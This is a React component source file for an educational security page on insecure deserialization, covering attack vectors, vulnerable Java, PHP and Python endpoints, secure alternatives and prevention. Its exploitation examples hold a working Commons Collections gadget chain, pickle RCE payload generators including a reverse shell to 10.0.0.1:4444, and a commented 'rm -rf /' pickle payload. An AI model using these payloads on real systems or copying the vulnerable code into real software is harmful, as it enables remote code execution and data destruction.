
import React from 'react';
import { Bug } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { InfoIcon } from 'lucide-react';

const InsecureDeserialization: React.FC = () => {
  return (
    <section id="deserial" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Insecure Deserialization</h3>
      
      <div className="space-y-6">
        {/* Introduction */}
        <div>
          <p className="mb-4">
            Insecure deserialization occurs when an application deserializes untrusted data without sufficient verification,
            allowing attackers to manipulate serialized objects to achieve harmful results, including remote code execution.
            This vulnerability can lead to serious attacks like authentication bypass, privilege escalation, and injection attacks.
            It's often difficult to detect and can have devastating consequences on application security, potentially allowing
            attackers to completely compromise the application server and gain access to sensitive data or internal systems.
          </p>
          
          <Alert className="mb-4 text-amber-900 dark:text-amber-200 bg-slate-50">
            <InfoIcon className="h-4 w-4" />
            <AlertTitle>Attacker's Goal</AlertTitle>
            <AlertDescription>
              Achieve remote code execution, bypass authentication and authorization controls, modify application logic,
              or access sensitive data by manipulating serialized objects that get processed by the application.
            </AlertDescription>
          </Alert>
        </div>

        {/* Attack Types */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Common Deserialization Attack Vectors</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <SecurityCard
              title="Java Gadget Chains"
              description="Exploiting libraries like Apache Commons Collections to create chains of method calls that lead to code execution during deserialization."
              severity="high"
            />
            <SecurityCard
              title="PHP Object Injection"
              description="Manipulating PHP objects to trigger magic methods like __destruct or __wakeup that execute dangerous operations during unserialization."
              severity="high"
            />
            <SecurityCard
              title="Python Pickle RCE"
              description="Abusing Python's pickle module to execute arbitrary code through specially crafted pickle data containing malicious bytecode."
              severity="high"
            />
            <SecurityCard
              title=".NET BinaryFormatter"
              description="Exploiting .NET's BinaryFormatter to achieve code execution through type confusion and gadget chains in the framework."
              severity="high"
            />
          </div>
        </div>

        {/* Vulnerable Components */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md">
            <ul className="list-disc pl-6 space-y-2">
              <li><strong>Session Management:</strong> Applications storing serialized session data in cookies or databases</li>
              <li><strong>Caching Systems:</strong> Redis, Memcached, or other caches storing serialized objects</li>
              <li><strong>API Endpoints:</strong> REST or RPC APIs accepting serialized data for processing</li>
              <li><strong>Message Queues:</strong> Systems like RabbitMQ, ActiveMQ processing serialized messages</li>
              <li><strong>Database Storage:</strong> Applications storing serialized objects in database fields</li>
              <li><strong>File Upload Systems:</strong> Applications processing uploaded serialized data files</li>
              <li><strong>Inter-Service Communication:</strong> Microservices communicating via serialized objects</li>
            </ul>
          </div>
        </div>

        {/* Why These Attacks Work */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Why Insecure Deserialization Attacks Work</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Technical Weaknesses</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Deserialization processes trust the data structure implicitly</li>
                <li>Magic methods and constructors execute automatically during deserialization</li>
                <li>Type confusion allows object substitution attacks</li>
                <li>Gadget chains leverage existing code to achieve malicious goals</li>
                <li>Insufficient input validation on serialized data</li>
                <li>Lack of integrity checks on serialized objects</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Implementation Flaws</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Using powerful serialization formats for untrusted data</li>
                <li>Accepting serialized data from user-controlled sources</li>
                <li>Missing class whitelisting for deserialization</li>
                <li>Inadequate sandboxing of deserialization processes</li>
                <li>Storing sensitive data in serialized format</li>
                <li>Poor separation between data and executable code</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Step-by-Step Attack Methodology */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Step-by-Step Attack Methodology</h4>
          <Tabs defaultValue="reconnaissance">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="reconnaissance">Reconnaissance</TabsTrigger>
              <TabsTrigger value="identification">Identification</TabsTrigger>
              <TabsTrigger value="exploitation">Exploitation</TabsTrigger>
              <TabsTrigger value="escalation">Escalation</TabsTrigger>
            </TabsList>
            
            <TabsContent value="reconnaissance" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 1: Serialization Discovery</h5>
                <ol className="list-decimal pl-6 space-y-2">
                  <li><strong>Identify Serialization Points:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Look for base64-encoded data in cookies, parameters, or headers</li>
                      <li>Check for binary data patterns in HTTP requests/responses</li>
                      <li>Analyze file upload endpoints that might process serialized data</li>
                      <li>Examine session storage mechanisms and caching systems</li>
                    </ul>
                  </li>
                  <li><strong>Technology Stack Analysis:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Identify programming language and frameworks in use</li>
                      <li>Look for serialization library indicators in responses</li>
                      <li>Check for known vulnerable libraries and versions</li>
                      <li>Analyze error messages for deserialization clues</li>
                    </ul>
                  </li>
                </ol>
              </div>
            </TabsContent>
            
            <TabsContent value="identification" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 2: Vulnerability Identification</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Detection Techniques:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Format Recognition:</strong> Identify serialization format (Java, PHP, Python, .NET)</li>
                    <li><strong>Data Manipulation:</strong> Modify serialized data and observe application behavior</li>
                    <li><strong>Error Injection:</strong> Inject malformed data to trigger deserialization errors</li>
                    <li><strong>Timing Analysis:</strong> Use time-based payloads to detect successful deserialization</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="exploitation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 3: Exploitation Development</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Exploitation Steps:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Gadget Chain Discovery:</strong> Find available classes for building exploit chains</li>
                    <li><strong>Payload Crafting:</strong> Create malicious serialized objects</li>
                    <li><strong>Delivery Method:</strong> Inject payload through identified attack vectors</li>
                    <li><strong>Execution Verification:</strong> Confirm successful code execution</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="escalation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 4: Post-Exploitation</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Escalation Techniques:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>System Reconnaissance:</strong> Gather information about the compromised system</li>
                    <li><strong>Privilege Escalation:</strong> Attempt to gain higher privileges</li>
                    <li><strong>Persistence:</strong> Establish persistent access to the system</li>
                    <li><strong>Lateral Movement:</strong> Move to other systems in the network</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Vulnerable Code Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Vulnerable Code Examples</h4>
          <CodeExample 
            language="java" 
            isVulnerable={true}
            title="Vulnerable Java Deserialization" 
            code={`// VULNERABLE: Accepting untrusted serialized data
import java.io.*;
import java.util.Base64;

@RestController
public class UserController {
    
    @PostMapping("/api/restore-session")
    public ResponseEntity<?> restoreSession(@RequestParam String sessionData) {
        try {
            // VULNERABLE: Deserializing untrusted data
            byte[] data = Base64.getDecoder().decode(sessionData);
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
            UserSession session = (UserSession) ois.readObject();
            
            // Process session...
            return ResponseEntity.ok(session);
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Invalid session data");
        }
    }
    
    // VULNERABLE: Reading serialized objects from file upload
    @PostMapping("/api/import-data")
    public ResponseEntity<?> importData(@RequestParam MultipartFile file) {
        try {
            ObjectInputStream ois = new ObjectInputStream(file.getInputStream());
            Object data = ois.readObject(); // Dangerous!
            
            // Process data...
            return ResponseEntity.ok("Data imported successfully");
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Import failed");
        }
    }
}`} 
          />
          
          <CodeExample 
            language="php" 
            isVulnerable={true}
            title="Vulnerable PHP Object Injection" 
            code={`<?php
// VULNERABLE: PHP object injection through cookies
class UserPreferences {
    public $theme = 'default';
    public $language = 'en';
    public $adminAccess = false;
    
    public function __destruct() {
        // DANGEROUS: File operation in destructor
        if ($this->adminAccess) {
            file_put_contents('/tmp/admin.log', 'Admin access granted');
        }
    }
}

// VULNERABLE: Deserializing user-controlled data
if (isset($_COOKIE['preferences'])) {
    $preferences = unserialize($_COOKIE['preferences']);
    
    // Use preferences...
    echo "Theme: " . $preferences->theme;
}

// VULNERABLE: Processing uploaded serialized data
if (isset($_POST['backup_data'])) {
    $backupData = unserialize($_POST['backup_data']);
    
    // Process backup...
    foreach ($backupData as $item) {
        echo $item;
    }
}

// Malicious payload example:
// O:15:"UserPreferences":3:{s:5:"theme";s:7:"default";s:8:"language";s:2:"en";s:11:"adminAccess";b:1;}
?>`} 
          />
          
          <CodeExample 
            language="python" 
            isVulnerable={true}
            title="Vulnerable Python Pickle Deserialization" 
            code={`import pickle
import base64
from flask import Flask, request

app = Flask(__name__)

# VULNERABLE: Pickle deserialization of untrusted data
@app.route('/api/load-data', methods=['POST'])
def load_data():
    try:
        # VULNERABLE: Deserializing user-provided pickle data
        pickled_data = base64.b64decode(request.json['data'])
        data = pickle.loads(pickled_data)  # Dangerous!
        
        # Process data...
        return {'status': 'success', 'data': str(data)}
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

# VULNERABLE: Loading session data from pickle
@app.route('/api/restore-session', methods=['POST'])
def restore_session():
    session_data = request.json.get('session')
    
    if session_data:
        # VULNERABLE: Unpickling session data
        try:
            session = pickle.loads(base64.b64decode(session_data))
            return {'user_id': session.get('user_id')}
        except Exception:
            return {'error': 'Invalid session'}
    
    return {'error': 'No session data'}

# Malicious pickle payload can execute arbitrary code:
# class EvilPickle:
#     def __reduce__(self):
#         import os
#         return (os.system, ('rm -rf /',))
# 
# payload = base64.b64encode(pickle.dumps(EvilPickle()))
`} 
          />
        </div>

        {/* Exploitation Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Real-World Exploitation Examples</h4>
          <CodeExample 
            language="java" 
            isVulnerable={true}
            title="Java Commons Collections Gadget Chain" 
            code={`// Example of Apache Commons Collections exploit chain
// This demonstrates how attackers chain existing classes to achieve RCE

// 1. Create a transformer that executes system commands
Transformer execTransformer = new InvokerTransformer("exec",
    new Class[] { String.class },
    new Object[] { "calc.exe" });

// 2. Create a transformer chain
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",
        new Class[] { String.class, Class[].class },
        new Object[] { "getRuntime", new Class[0] }),
    new InvokerTransformer("invoke",
        new Class[] { Object.class, Object[].class },
        new Object[] { null, new Object[0] }),
    execTransformer
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

// 3. Create a map that triggers the transformer chain
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);

// 4. Create the final payload object
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
BadAttributeValueExpException payload = new BadAttributeValueExpException(null);

// Use reflection to set the val field
Field valField = payload.getClass().getDeclaredField("val");
valField.setAccessible(true);
valField.set(payload, entry);

// When this object is deserialized, it will execute calc.exe`} 
          />
          
          <CodeExample 
            language="python" 
            isVulnerable={true}
            title="Python Pickle RCE Payload Generation" 
            code={`import pickle
import base64
import os

# Method 1: Using __reduce__ method
class RCEPayload:
    def __reduce__(self):
        # This will execute when the object is unpickled
        return (os.system, ('whoami',))

# Serialize the malicious object
malicious_payload = pickle.dumps(RCEPayload())
encoded_payload = base64.b64encode(malicious_payload).decode()

print(f"Malicious payload: {encoded_payload}")

# Method 2: Direct pickle opcodes manipulation
import pickletools

def generate_rce_pickle(command):
    # Create a pickle that executes arbitrary command
    pickle_payload = b"""cos
system
(S'""" + command.encode() + b"""'
tR."""
    
    return base64.b64encode(pickle_payload).decode()

# Generate payload for reverse shell
reverse_shell_cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
rce_payload = generate_rce_pickle(reverse_shell_cmd)

print(f"Reverse shell payload: {rce_payload}")

# Method 3: Using eval for more complex payloads
class EvalPayload:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id')",))

eval_payload = base64.b64encode(pickle.dumps(EvalPayload())).decode()
print(f"Eval payload: {eval_payload}")`} 
          />
        </div>

        {/* Secure Implementations */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Secure Implementation Examples</h4>
          <CodeExample 
            language="java" 
            isVulnerable={false}
            title="Secure Java Deserialization with Filtering" 
            code={`// SECURE: Using JSON instead of Java serialization
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.ObjectInputFilter;

@RestController
public class SecureUserController {
    
    private final ObjectMapper objectMapper = new ObjectMapper();
    
    @PostMapping("/api/restore-session")
    public ResponseEntity<?> restoreSession(@RequestParam String sessionData) {
        try {
            // SECURE: Using JSON instead of Java serialization
            UserSession session = objectMapper.readValue(sessionData, UserSession.class);
            
            // Additional validation
            if (isValidSession(session)) {
                return ResponseEntity.ok(session);
            } else {
                return ResponseEntity.badRequest().body("Invalid session");
            }
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Invalid session format");
        }
    }
    
    // If Java serialization is absolutely necessary, use filtering
    @PostMapping("/api/import-data-filtered")
    public ResponseEntity<?> importDataWithFilter(@RequestParam MultipartFile file) {
        try {
            ObjectInputStream ois = new ObjectInputStream(file.getInputStream());
            
            // SECURE: Apply deserialization filter
            ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
                "com.myapp.model.*;java.util.ArrayList;java.util.HashMap;!*"
            );
            ois.setObjectInputFilter(filter);
            
            Object data = ois.readObject();
            
            // Additional validation
            if (isValidDataType(data)) {
                return ResponseEntity.ok("Data imported successfully");
            } else {
                return ResponseEntity.badRequest().body("Invalid data type");
            }
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Import failed");
        }
    }
    
    private boolean isValidSession(UserSession session) {
        return session != null && 
               session.getUserId() != null && 
               session.getCreatedTime() != null &&
               session.getCreatedTime().isAfter(Instant.now().minus(Duration.ofHours(24)));
    }
    
    private boolean isValidDataType(Object data) {
        // Whitelist allowed types
        return data instanceof List || data instanceof Map;
    }
}`} 
          />
          
          <CodeExample 
            language="python" 
            isVulnerable={false}
            title="Secure Python Alternatives to Pickle" 
            code={`import json
import hmac
import hashlib
from flask import Flask, request

app = Flask(__name__)
SECRET_KEY = 'your-secret-key-here'

# SECURE: Using JSON instead of pickle
@app.route('/api/load-data', methods=['POST'])
def load_data_secure():
    try:
        # SECURE: Using JSON for data serialization
        data = json.loads(request.json['data'])
        
        # Validate data structure
        if validate_data_structure(data):
            return {'status': 'success', 'data': data}
        else:
            return {'status': 'error', 'message': 'Invalid data structure'}
    except json.JSONDecodeError:
        return {'status': 'error', 'message': 'Invalid JSON format'}

# SECURE: Using signed data for session management
@app.route('/api/restore-session', methods=['POST'])
def restore_session_secure():
    session_data = request.json.get('session')
    signature = request.json.get('signature')
    
    if session_data and signature:
        # SECURE: Verify HMAC signature
        expected_signature = hmac.new(
            SECRET_KEY.encode(),
            session_data.encode(),
            hashlib.sha256
        ).hexdigest()
        
        if hmac.compare_digest(signature, expected_signature):
            try:
                session = json.loads(session_data)
                return {'user_id': session.get('user_id')}
            except json.JSONDecodeError:
                return {'error': 'Invalid session format'}
        else:
            return {'error': 'Invalid signature'}
    
    return {'error': 'Missing session data or signature'}

def validate_data_structure(data):
    # Validate expected data structure
    if not isinstance(data, dict):
        return False
    
    required_fields = ['type', 'content']
    if not all(field in data for field in required_fields):
        return False
    
    # Additional validation rules
    allowed_types = ['user_data', 'config', 'report']
    if data['type'] not in allowed_types:
        return False
    
    return True

# SECURE: Alternative using cryptographic signatures
import cryptography.fernet

class SecureSerializer:
    def __init__(self, key):
        self.fernet = cryptography.fernet.Fernet(key)
    
    def serialize(self, data):
        json_data = json.dumps(data).encode()
        return self.fernet.encrypt(json_data).decode()
    
    def deserialize(self, encrypted_data):
        try:
            decrypted_data = self.fernet.decrypt(encrypted_data.encode())
            return json.loads(decrypted_data.decode())
        except Exception:
            raise ValueError("Invalid or tampered data")`} 
          />
        </div>

        {/* Testing Tools */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Deserialization Testing Tools</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Automated Testing Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>ysoserial:</strong> Java deserialization payload generator</li>
                <li><strong>ysoserial.net:</strong> .NET deserialization payload generator</li>
                <li><strong>phpggc:</strong> PHP unserialize() payload generator</li>
                <li><strong>Burp Suite:</strong> Deserialization scanner extensions</li>
                <li><strong>Freddy:</strong> Burp extension for deserialization detection</li>
                <li><strong>Java Deserialization Scanner:</strong> OWASP ZAP addon</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Manual Testing Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>SerializationDumper:</strong> Java serialization analyzer</li>
                <li><strong>objection:</strong> Runtime mobile application testing</li>
                <li><strong>GadgetProbe:</strong> Gadget chain discovery tool</li>
                <li><strong>Custom Scripts:</strong> Language-specific payload generators</li>
                <li><strong>Binary Analysis Tools:</strong> Hex editors and binary analyzers</li>
                <li><strong>Network Proxies:</strong> Intercept and modify serialized data</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Prevention Strategies */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Comprehensive Prevention Strategies</h4>
          <Tabs defaultValue="design">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="design">Design Principles</TabsTrigger>
              <TabsTrigger value="implementation">Implementation</TabsTrigger>
              <TabsTrigger value="monitoring">Monitoring</TabsTrigger>
            </TabsList>
            
            <TabsContent value="design" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold mb-2">Secure Design Principles</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Avoid deserialization of untrusted data whenever possible</li>
                    <li>Use safer data formats like JSON, XML, or Protocol Buffers</li>
                    <li>Implement strict input validation and type checking</li>
                    <li>Apply the principle of least privilege to application components</li>
                    <li>Use cryptographic signatures to verify data integrity</li>
                    <li>Implement proper error handling without information disclosure</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="implementation" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold mb-2">Implementation Controls</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Use deserialization filters and whitelisting (Java 9+)</li>
                    <li>Implement custom serialization validation logic</li>
                    <li>Run deserialization in isolated sandboxes or containers</li>
                    <li>Use libraries with built-in security features</li>
                    <li>Regularly update and patch serialization libraries</li>
                    <li>Implement runtime application self-protection (RASP)</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="monitoring" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold mb-2">Monitoring and Detection</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Monitor and log all deserialization activities</li>
                    <li>Implement anomaly detection for unusual object types</li>
                    <li>Set up alerts for deserialization errors and exceptions</li>
                    <li>Use security information and event management (SIEM) systems</li>
                    <li>Perform regular security assessments and penetration testing</li>
                    <li>Monitor for indicators of compromise (IoCs)</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Special Cases */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Special Cases and Environment Considerations</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Language-Specific Considerations</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Java:</strong> Use ObjectInputFilter, avoid Apache Commons Collections</li>
                <li><strong>PHP:</strong> Prefer JSON over serialize(), validate class types</li>
                <li><strong>Python:</strong> Never use pickle with untrusted data, use JSON</li>
                <li><strong>.NET:</strong> Avoid BinaryFormatter, use DataContractSerializer</li>
                <li><strong>Node.js:</strong> Use JSON.parse(), avoid eval() or Function()</li>
                <li><strong>Ruby:</strong> Avoid Marshal.load(), use JSON or YAML safely</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Environment-Specific Issues</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Microservices:</strong> Secure inter-service communication protocols</li>
                <li><strong>Cloud Deployments:</strong> Container escape and privilege escalation risks</li>
                <li><strong>Legacy Systems:</strong> Older libraries with known vulnerabilities</li>
                <li><strong>Mobile Applications:</strong> Local storage and inter-app communication</li>
                <li><strong>IoT Devices:</strong> Limited security controls and update mechanisms</li>
                <li><strong>Big Data:</strong> Distributed processing of serialized objects</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default InsecureDeserialization;
